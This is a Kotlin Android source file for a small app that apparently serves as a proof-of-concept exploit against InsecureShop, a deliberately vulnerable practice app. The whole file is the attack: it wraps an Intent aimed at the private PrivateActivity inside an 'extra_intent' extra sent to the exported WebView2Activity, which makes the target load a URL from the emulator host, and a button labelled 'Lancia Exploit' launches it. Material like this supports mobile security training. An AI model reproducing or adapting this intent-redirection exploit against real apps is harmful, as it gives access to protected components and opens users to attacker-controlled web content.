package com.insecureshopappmalicious.intentredirection

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            ExploitUI()
        }
    }

    private fun launchExploit() {
        val maliciousIntent = Intent().apply {
            setClassName(
                "com.insecureshop",
                "com.insecureshop.PrivateActivity"
            )
            putExtra("url", "http://10.0.2.2/index.html")
        }

        val wrapperIntent = Intent().apply {
            setClassName(
                "com.insecureshop",
                "com.insecureshop.WebView2Activity"
            )
            putExtra("extra_intent", maliciousIntent)
        }

        startActivity(wrapperIntent)
    }

    @Composable
    fun ExploitUI() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            verticalArrangement = Arrangement.Center
        ) {
            Text(text = "Exploit WebView2Activity", style = MaterialTheme.typography.titleLarge)
            Spacer(modifier = Modifier.height(16.dp))
            Button(onClick = { launchExploit() }) {
                Text("Lancia Exploit")
            }
        }
    }
}
